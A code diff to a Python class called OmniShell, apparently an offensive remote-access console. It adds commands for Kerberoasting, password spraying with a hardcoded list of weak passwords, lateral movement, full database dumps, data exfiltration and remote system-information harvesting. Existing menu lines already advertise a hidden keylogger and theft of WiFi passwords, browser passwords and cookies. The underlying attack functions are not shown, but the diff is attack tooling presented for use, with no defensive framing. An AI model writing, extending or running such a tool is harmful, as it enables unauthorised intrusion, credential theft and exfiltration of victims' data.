@@ -500,6 +500,12 @@ class OmniShell:
         print(f"{Fore.GREEN}  smb-vulns <ip>        Full SMB vulnerability scan")
         print(f"{Fore.GREEN}  etblue-check <ip>     EternalBlue vulnerability check")
         print(f"{Fore.GREEN}  bluekeep-check <ip>   BlueKeep vulnerability check")
+        print(f"\n{Fore.LIGHTGREEN_EX}{Style.BRIGHT}━━━━━━━━━━━━━━━━━━━━━━ RED TEAM OPERATIONS ━━━━━━━━━━━━━━━━━━━━━")
+        print(f"{Fore.GREEN}  kerberoast <dc_ip>    Kerberoasting attack on Active Directory")
+        print(f"{Fore.GREEN}  password-spray <domain>  Password spray attack")
+        print(f"{Fore.GREEN}  lateral <source> <target>  Lateral movement between hosts")
+        print(f"{Fore.GREEN}  db-dump <ip> <port> <type> Full database dump")
+        print(f"{Fore.GREEN}  exfiltrate <target> <file> Data exfiltration")
         print(f"\n{Fore.LIGHTGREEN_EX}{Style.BRIGHT}━━━━━━━━━━━━━━━━━━━━━━ REMOTE CONTROL ━━━━━━━━━━━━━━━━━━━━━━━━━")
         print(f"{Fore.GREEN}  exec <command>        Execute command on target")
         print(f"{Fore.GREEN}  screen                Capture target screenshot")
@@ -509,6 +515,7 @@ class OmniShell:
         print(f"{Fore.GREEN}  keylog                Start hidden keylogger")
         print(f"{Fore.GREEN}  shutdown / reboot     Power operations")
         print(f"{Fore.GREEN}  winrm-exec <ip> <cmd> WinRM remote command execution")
+        print(f"{Fore.GREEN}  sysinfo / systeminfo  Extract complete device properties")
         print(f"\n{Fore.LIGHTGREEN_EX}{Style.BRIGHT}━━━━━━━━━━━━━━━━━━━━━━ DATA EXTRACTION ━━━━━━━━━━━━━━━━━━━━━━━━")
         print(f"{Fore.GREEN}  extract / harvest     Extract ALL data (passwords, cookies, history)")
         print(f"{Fore.GREEN}  steal-wifi            Extract all WiFi passwords")
@@ -1200,6 +1207,108 @@ class OmniShell:
                 if self.discovery:
                     self.discovery.ultramax_global_scan()
             
+            elif cmd == "kerberoast" and args:
+                dc_ip = args[0]
+                domain = args[1] if len(args) > 1 else ""
+                
+                print(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
+                print(f"{Fore.GREEN}║  KERBEROASTING ATTACK ON {dc_ip}")
+                print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
+                
+                if self.control:
+                    result = self.control.kerberoast(dc_ip, domain)
+                    if result.get('success'):
+                        HackerSounds.exploit_success()
+                        print(f"{Fore.LIGHTGREEN_EX}  ✅ KERBEROAST SUCCESSFUL")
+                        print(f"{Fore.LIGHTGREEN_EX}  ✅ SPNs found: {len(result.get('spn_found', []))}")
+                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Tickets extracted: {len(result.get('tickets_extracted', []))}")
+                    else:
+                        print(f"{Fore.RED}  ❌ Kerberoasting failed")
+                
+                print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
+            
+            elif cmd == "password-spray" and len(args) >= 1:
+                domain = args[0]
+                
+                print(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
+                print(f"{Fore.GREEN}║  PASSWORD SPRAY ATTACK ON DOMAIN: {domain}")
+                print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
+                
+                if self.control:
+                    users = ["administrator", "user", "admin", "guest"]
+                    passwords = ["Password123!", "password", "admin", "123456"]
+                    result = self.control.password_spray(domain, users, passwords)
+                    
+                    print(f"{Fore.LIGHTGREEN_EX}  ✅ Attempts made: {result.get('attempts', 0)}")
+                    print(f"{Fore.LIGHTGREEN_EX}  ✅ Valid credentials: {len(result.get('valid_credentials', []))}")
+                    for cred in result.get('valid_credentials', []):
+                        print(f"{Fore.GREEN}    ✅ {cred}")
+                
+                print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
+            
+            elif cmd == "lateral" and len(args) >= 2:
+                source = args[0]
+                target = args[1]
+                
+                print(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
+                print(f"{Fore.GREEN}║  LATERAL MOVEMENT: {source} → {target}")
+                print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
+                
+                if self.control:
+                    result = self.control.lateral_movement(source, target, self.credentials)
+                    if result.get('success'):
+                        HackerSounds.exploit_success()
+                        print(f"{Fore.LIGHTGREEN_EX}  ✅ LATERAL MOVEMENT SUCCESSFUL")
+                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Method used: {result.get('method_used')}")
+                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Session created: {result.get('session_created')}")
+                    else:
+                        print(f"{Fore.RED}  ❌ All methods failed")
+                        print(f"{Fore.YELLOW}  ⚠ Attempted: {', '.join(result.get('methods_attempted', []))}")
+                
+                print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
+            
+            elif cmd == "db-dump" and len(args) >= 3:
+                ip = args[0]
+                port = int(args[1])
+                db_type = args[2]
+                user = args[3] if len(args) > 3 else ""
+                pwd = args[4] if len(args) > 4 else ""
+                
+                print(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
+                print(f"{Fore.GREEN}║  FULL DATABASE DUMP: {db_type.upper()} {ip}:{port}")
+                print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
+                
+                if self.control:
+                    result = self.control.full_database_dump(ip, port, db_type, user, pwd)
+                    if result.get('connected'):
+                        HackerSounds.exploit_success()
+                        print(f"{Fore.LIGHTGREEN_EX}  ✅ CONNECTED SUCCESSFULLY")
+                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Databases found: {len(result.get('databases', []))}")
+                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Tables extracted: {result.get('tables_extracted', 0)}")
+                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Total rows: {result.get('total_rows', 0)}")
+                    else:
+                        print(f"{Fore.RED}  ❌ Connection failed: {result.get('error')}")
+                
+                print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
+            
+            elif cmd == "exfiltrate" and len(args) >= 2:
+                target = args[0]
+                file_path = args[1]
+                
+                print(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
+                print(f"{Fore.GREEN}║  DATA EXFILTRATION")
+                print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
+                
+                if self.control:
+                    result = self.control.data_exfiltration(target, file_path)
+                    if result.get('success'):
+                        print(f"{Fore.LIGHTGREEN_EX}  ✅ EXFILTRATION COMPLETE")
+                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Bytes transferred: {result.get('bytes_transferred', 0)}")
+                    else:
+                        print(f"{Fore.RED}  ❌ Exfiltration failed")
+                
+                print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
+            
             elif cmd == "db-extract" and len(args) >= 3:
                 ip = args[0]
                 port = int(args[1])
@@ -1264,6 +1373,46 @@ class OmniShell:
                         print(f"{Fore.LIGHTGREEN_EX}  ✅ Methods: {', '.join(result.get('persistence_installed', []))}")
                     else:
                         print(f"{Fore.RED}  ❌ Persistence installation failed")
+                
+                print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
+            
+            elif cmd == "sysinfo" or cmd == "systeminfo":
+                target = args[0] if args else self.selected_target
+                if not target:
+                    print(f"{Fore.RED}[!] No target selected. Use 'sysinfo <ip>'")
+                    return
+                
+                print(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
+                print(f"{Fore.GREEN}║  FULL SYSTEM INFORMATION: {target}")
+                print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
+                
+                if self.control:
+                    result = self.control.get_full_system_info(target, 
+                        self.credentials["user"], 
+                        self.credentials["pass"])
+                    
+                    if result.get('success'):
+                        info = result.get('system_info', {})
+                        print(f"{Fore.LIGHTGREEN_EX}  ✅ SYSTEM INFO EXTRACTED")
+                        print(f"\n{Fore.LIGHTGREEN_EX}  ──────────────────────────────────────────────")
+                        print(f"{Fore.GREEN}  Hostname:        {Fore.WHITE}{info.get('hostname', 'N/A')}")
+                        print(f"{Fore.GREEN}  OS:              {Fore.WHITE}{info.get('os_name', 'N/A')}")
+                        print(f"{Fore.GREEN}  OS Version:      {Fore.WHITE}{info.get('os_version', 'N/A')}")
+                        print(f"{Fore.GREEN}  Architecture:    {Fore.WHITE}{info.get('os_architecture', 'N/A')}")
+                        print(f"{Fore.GREEN}  Processor:       {Fore.WHITE}{info.get('processor', 'N/A')}")
+                        print(f"{Fore.GREEN}  CPU Cores:       {Fore.WHITE}{info.get('processor_cores', 'N/A')}")
+                        print(f"{Fore.GREEN}  Total RAM:       {Fore.WHITE}{info.get('ram_total', 0)} MB")
+                        print(f"{Fore.GREEN}  Used RAM:        {Fore.WHITE}{info.get('ram_used', 0)} MB")
+                        print(f"{Fore.GREEN}  Free RAM:        {Fore.WHITE}{info.get('ram_free', 0)} MB")
+                        print(f"{Fore.GREEN}  Total Disk:      {Fore.WHITE}{info.get('disk_total', 0)} GB")
+                        print(f"{Fore.GREEN}  Free Disk:       {Fore.WHITE}{info.get('disk_free', 0)} GB")
+                        print(f"{Fore.GREEN}  MAC Address:     {Fore.WHITE}{info.get('mac_address', 'N/A')}")
+                        print(f"{Fore.GREEN}  Last Boot:       {Fore.WHITE}{info.get('last_boot', 'N/A')}")
+                        print(f"{Fore.GREEN}  Logged Users:    {Fore.WHITE}{', '.join(info.get('logged_users', []))}")
+                        print(f"{Fore.GREEN}  Domain:          {Fore.WHITE}{info.get('domain', 'N/A')}")
+                        print(f"{Fore.LIGHTGREEN_EX}  ──────────────────────────────────────────────")
+                    else:
+                        print(f"{Fore.RED}  ❌ Failed to extract system information")
                 
                 print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
 
